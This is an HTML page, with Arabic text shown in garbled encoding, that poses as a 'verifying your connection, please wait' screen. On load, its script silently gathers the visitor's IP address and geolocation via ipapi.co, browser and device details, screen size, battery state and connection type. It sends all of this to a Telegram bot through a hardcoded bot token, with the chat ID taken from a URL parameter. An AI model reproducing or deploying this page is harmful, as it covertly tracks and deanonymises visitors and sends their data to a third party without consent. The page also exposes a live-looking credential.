<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚...</title>
  <style>
    body {
      background-color: #f4f4f4;
      font-family: 'Cairo', sans-serif;
      text-align: center;
      padding-top: 20%;
      color: #333;
    }
    .loading {
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <h2>ğŸ“¡ ÙŠØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§ØªØµØ§Ù„Ùƒ...</h2>
  <div class="loading">ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹...</div>

  <script>
    async function getIPInfo() {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    }

    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "Ù†Ø¹Ù…" : "Ù„Ø§"
        };
      }
      return { level: "ØºÙŠØ± Ù…ØªØ§Ø­", charging: "ØºÙŠØ± Ù…ØªØ§Ø­" };
    }

    async function collectData() {
      const ip = await getIPInfo();
      const battery = await getBatteryInfo();
      const connection = navigator.connection || {};
      const time = new Date().toLocaleString('ar-YE');

      return {
        ip: ip.ip,
        country: ip.country_name,
        city: ip.city,
        region: ip.region,
        timezone: ip.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: time,
        os: navigator.platform,
        browser: navigator.userAgent,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ù…Ø¸Ù„Ù…" : "ÙØ§ØªØ­",
        battery: battery.level + "%",
        charging: battery.charging,
        connection: connection.effectiveType || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ"
      };
    }

    function formatMessage(data) {
      return `ğŸ“¡ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹:

ğŸ§  Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø²Ø§Ø¦Ø±:
ğŸ”¹ IP: ${data.ip}
ğŸ”¹ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${data.country}
ğŸ”¹ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${data.city}, ${data.region}
ğŸ”¹ Ø§Ù„ØªÙˆÙ‚ÙŠØª Ø§Ù„Ù…Ø­Ù„ÙŠ: ${data.time}
ğŸ”¹ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${data.timezone}

ğŸ–¥ï¸ Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ØªØµÙØ­:
ğŸ”¸ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${data.os}
ğŸ”¸ Ø§Ù„Ù…ØªØµÙØ­: ${data.browser}
ğŸ”¸ Ø§Ù„Ù„ØºØ©: ${data.language}
ğŸ”¸ Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©: ${data.screen}
ğŸ”¸ Ø§Ù„ÙˆØ¶Ø¹: ${data.theme}

ğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:
ğŸ”¸ Ø§Ù„Ø´Ø­Ù†: ${data.battery}
ğŸ”¸ Ù…ÙˆØµÙ„ Ø¨Ø§Ù„ÙƒÙ‡Ø±Ø¨Ø§Ø¡: ${data.charging}

ğŸ“¶ Ø§Ù„Ø§ØªØµØ§Ù„:
ğŸ”¸ Ù†ÙˆØ¹ Ø§Ù„Ø§ØªØµØ§Ù„: ${data.connection}

âš ï¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø£ÙØ±Ø³Ù„Øª Ù…Ù† Ø®Ù„Ø§Ù„ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ù…Ø®ØµØµØ© Ù„Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ø¬Ø¯Ø¯.
------------------------`;
    }

    async function sendToTelegram(msg) {
      const chatId = new URLSearchParams(window.location.search).get("ref") || "7121448697"; // â† Ø¨Ø¯Ù‘Ù„Ù‡ Ù„Ùˆ Ù„Ø²Ù… Ø§Ù„Ø£Ù…Ø±
      const token = "8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4"; // â† ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg
        })
      });
    }

    (async () => {
      const data = await collectData();
      const msg = formatMessage(data);
      await sendToTelegram(msg);
    })();
  </script>
</body>
</html>